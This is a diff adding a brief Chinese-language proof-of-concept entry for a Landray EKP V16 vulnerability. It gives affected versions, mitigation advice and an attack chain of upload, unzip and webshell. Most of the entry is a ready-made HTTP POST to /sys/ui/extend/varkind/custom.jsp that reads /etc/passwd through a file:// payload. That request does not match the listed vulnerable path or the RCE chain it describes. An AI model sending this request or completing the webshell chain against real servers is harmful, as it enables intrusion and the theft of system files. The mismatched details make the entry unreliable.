@@ -1,0 +1,16 @@
+受影响版本：
+   蓝凌EKP V16 (最新版)受影响存在远程代码执行漏洞；V15暂无环境验证，可能受影响。
+修复方案：
+   使用网络ACL限制该OA的访问来源，加强监测，重点拦截GET请求中带有../等目录穿越特征的URL。
+通过文件上传-->解压-->获取webshell，前台漏洞
+漏洞路径：
+/api///sys/ui/sys_ui_extend/sysUiExtend.do
+
+POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+Host: xxx
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Accept: /
+Connection: Keep-Alive
+Content-Length: 42
+Content-Type: application/x-www-form-urlencoded
+var={"body":{"file":"file:///etc/passwd"}}
